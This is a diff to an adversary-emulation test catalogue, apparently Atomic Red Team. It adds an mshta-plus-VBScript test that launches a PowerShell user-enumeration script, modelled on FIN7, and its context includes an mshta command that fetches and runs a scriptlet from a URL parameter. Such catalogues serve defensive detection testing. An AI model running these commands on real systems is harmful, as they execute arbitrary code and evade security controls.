@@ -8828,6 +8828,24 @@ defense-evasion:
         command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
 
 '
+    - name: Mshta executes VBScript to execute malicious code
+      description: |
+        Run a local VB script to run local user enumeration powershell command
+
+        This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
+      supported_platforms:
+      - windows
+      input_arguments:
+        atomics_path:
+          description: path to atomics folder
+          type: path
+          default: "..\\..\\atomics"
+      executor:
+        name: command_prompt
+        command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
+          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+
+'
   T1096:
     technique:
       x_mitre_data_sources:
@@ -19151,6 +19169,24 @@ execution:
         name: command_prompt
         elevation_required: false
         command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
+
+'
+    - name: Mshta executes VBScript to execute malicious code
+      description: |
+        Run a local VB script to run local user enumeration powershell command
+
+        This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
+      supported_platforms:
+      - windows
+      input_arguments:
+        atomics_path:
+          description: path to atomics folder
+          type: path
+          default: "..\\..\\atomics"
+      executor:
+        name: command_prompt
+        command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
+          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
 
 '
   T1086:
